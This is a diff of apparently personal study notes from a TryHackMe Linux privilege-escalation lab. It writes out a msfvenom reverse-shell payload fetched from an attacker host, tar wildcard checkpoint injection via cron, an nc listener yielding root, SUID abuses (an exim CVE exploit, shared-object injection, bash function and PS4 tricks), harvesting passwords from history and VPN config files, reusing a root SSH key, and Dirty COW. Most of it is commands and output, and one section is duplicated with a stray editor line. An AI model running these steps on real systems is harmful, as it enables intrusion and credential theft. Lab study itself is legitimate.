@@ -19,9 +19,9 @@ Host:
 go to path where the file is and start a server:
 python3 -m http.server 8000
 Target:
-user3@polobox:~$ wget 10.6.4.208:8000/LinEnum.sh
---2024-05-12 22:25:44--  http://10.6.4.208:8000/LinEnum.sh
-Connecting to 10.6.4.208:8000... connected.
+user3@polobox:~$ wget myip:8000/LinEnum.sh
+--2024-05-12 22:25:44--  http://myip:8000/LinEnum.sh
+Connecting to myip:8000... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 46631 (46K) [text/x-sh]
 Saving to: ‘LinEnum.sh’
@@ -136,10 +136,270 @@ I couldn't get this to work for me so I'm not going to note on it but follow thi
 CRON JOBS - WILDCARDS
 First you are able to find a wildcard marked by *
 to exploit a wildcard we can create a payload using msfvenom:
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.4.208 LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=myip LPORT=4444 -f elf -o shell.elf
 Now we can start a server on our own port using
 python3 -m http.server 8000
 and then we can get the file on the remote machine using:
-wget 10.6.4.208:8000/shell.elf
+wget myip:8000/shell.elf
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+
+Creating these two files ^ the wildcard will act on them as cron commands and exec the .elf file. 
+setting up netcat on 4444 results in a reverse shell
+└─$ nc -nlvp 4444            
+listening on [any] 4444 ...
+connect to [myip] from (UNKNOWN) [10.10.227.93] 46989
+whoami
+root
+
+SUID/SGID Executables -Know Exploits
+Finding all SUID/SGID execs:
+user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
+-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
+-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
+-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
+-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
+-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
+-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
+-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
+-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
+-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
+-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
+-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
+-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
+-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
+-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
+-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
+-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
+-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
+-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
+-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
+-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
+-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
+You can find an exec for one of the files known as /usr/sbin/exim-4.84-3 on exploit-db and then run this exploit to gain root:
+user@debian:~/tools/suid/exim$ ls
+cve-2016-1531.sh
+user@debian:~/tools/suid/exim$ ./cve-2016-1531.sh 
+[ CVE-2016-1531 local root exploit
+sh-4.1# 
+
+SUID/SGID EXECUTABLES- SHARED OBJECT INJECTION
+using strace you can see
+user@debian:/usr/local/bin$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+
+now create a config file for the libcalc.so file
+mkdir /home/user/.config
+user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c
+user@debian:~$ cd /
+user@debian:/$ cd /usr/local/bin
+user@debian:/usr/local/bin$ ls
+compress.sh  overwrite.sh  suid-env  suid-env2  suid-so
+user@debian:/usr/local/bin$ ./suid-so
+Calculating something, please wait...
+bash-4.1# 
+
+SUID/SGID EXECUTABLES - ENVIRONMENT VARIABLES
+gcc -o service /home/user/tools/suid/service.c
+user@debian:~/tools/suid$ /home/user/tools/suid/service PATH=. :$PATH /usr/local/bin/suid-env
+user@debian:~/tools/suid$ cd /
+user@debian:/$ cd /usr/local/bin
+user@debian:/usr/local/bin$ ./suid-env
+
+SUID/SGID EXECUTABLES ABUSING SHELL FEATURES
+this time when you run strings on suid-env2 it's running from a direct path:
+user@debian:/usr/local/bin$ strings suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+user@debian:/usr/local/bin$ /bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+user@debian:/usr/local/bin$ /usr/local/bin/suid-env2
+root@debian:/usr/local/bin#
+
+SUID/SGID EXECUTABLES - ABUSING SHELL FEATURES #2 
+This will not work on Bash versions 4.4 and above.
+user@debian:/usr/local/bin$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+/usr/sbin/service apache2 start
+basename /usr/sbin/service
+VERSION='service ver. 0.91-ubuntu1'
+basename /usr/sbin/service
+USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
+SERVICE=
+ACTION=
+SERVICEDIR=/etc/init.d
+OPTIONS=
+'[' 2 -eq 0 ']'
+cd /
+'[' 2 -gt 0 ']'
+case "${1}" in
+'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
+'[' 2 -eq 2 -a start = --full-restart ']'
+'[' -z '' ']'
+SERVICE=apache2
+shift
+'[' 1 -gt 0 ']'
+case "${1}" in
+'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
+'[' 1 -eq 2 -a '' = --full-restart ']'
+'[' -z apache2 ']'
+'[' -z '' ']'
+ACTION=start
+shift
+'[' 0 -gt 0 ']'
+'[' -r /etc/init/apache2.conf ']'
+'[' -x /etc/init.d/apache2 ']'
+exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
+Starting web server: apache2httpd (pid 1709) already running
+.
+user@debian:/usr/local/bin$ /tmp/rootbash -p
+rootbash-4.1# 
+
+PASSWORDS & KEYS - HISTORY FILES
+If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+user@debian:/usr/local/bin$ cat ~/.*history | less
+ls -al
+cat .bash_history 
+ls -al
+mysql -h somehost.local -uroot -ppassword123
+exit
+cd /tmp
+clear
+ifconfig
+netstat -antp
+nano myvpn.ovpn 
+ls
+whoami
+exit
+exit
+exit
+identify
+user@debian:/usr/local/bin$ su root
+Password: 
+root@debian:/usr/local/bin# 
+
+PASSWORD & KEYS - CONFIG FILES
+user@debian:/usr/local/bin$ ls /home/user
+libcalc.c  myvpn.ovpn  tools
+user@debian:/usr/local/bin$ cat /home/user/myvpn.ovpn 
+client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server
+auth-user-pass /etc/openvpn/auth.txt
+comp-lzo
+verb 1
+reneg-sec 0
+
+user@debian:/usr/local/bin$ cat /etc/openvpn/auth.txt
+root
+password123
+
+PASSWORDS & KEYS - SSH KEYS
+user@debian:/usr/local/bin$ ls -l /.ssh
+total 4
+-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
+user@debian:/usr/local/bin$ cd /
+user@debian:/$ cd .ssh
+user@debian:/.ssh$ chmod 600 root_key
+chmod: changing permissions of `root_key': Operation not permitted
+user@debian:/.ssh$ cp root_key ..
+cp: cannot create regular file `../root_key': Permission denied
+user@debian:/.ssh$ cd ..
+user@debian:/$ cd home/user
+user@debian:~$ cp /.ssh/root_key .
+user@debian:~$ chmod 600 root_key
+user@debian:~$ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.227.93
+
+NFS 
+There is a lot to this one go back and read through it at :   GNU nano 7.2                   privEscBasics.txt                    Modified
+password123
+
+PASSWORDS & KEYS - SSH KEYS
+user@debian:/usr/local/bin$ ls -l /.ssh
+total 4
+-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
+user@debian:/usr/local/bin$ cd /
+user@debian:/$ cd .ssh
+user@debian:/.ssh$ chmod 600 root_key
+chmod: changing permissions of `root_key': Operation not permitted
+user@debian:/.ssh$ cp root_key ..
+cp: cannot create regular file `../root_key': Permission denied
+user@debian:/.ssh$ cd ..
+user@debian:/$ cd home/user
+user@debian:~$ cp /.ssh/root_key .
+user@debian:~$ chmod 600 root_key
+user@debian:~$ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgor>
+
+NFS
+There is a lot to this one go back and read through it at : https://tryhackme.com/r/room/linuxprivesc task 19
+
+KERNEL EXPLOITS
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
+
+Compile the code and run it (note that it may take several minutes to complete):
+
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+
+Once the exploit completes, run /usr/bin/passwd to gain a root shell:
+
+/usr/bin/passwd
+
+Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
+
+mv /tmp/bak /usr/bin/passwd
+exit
 
 
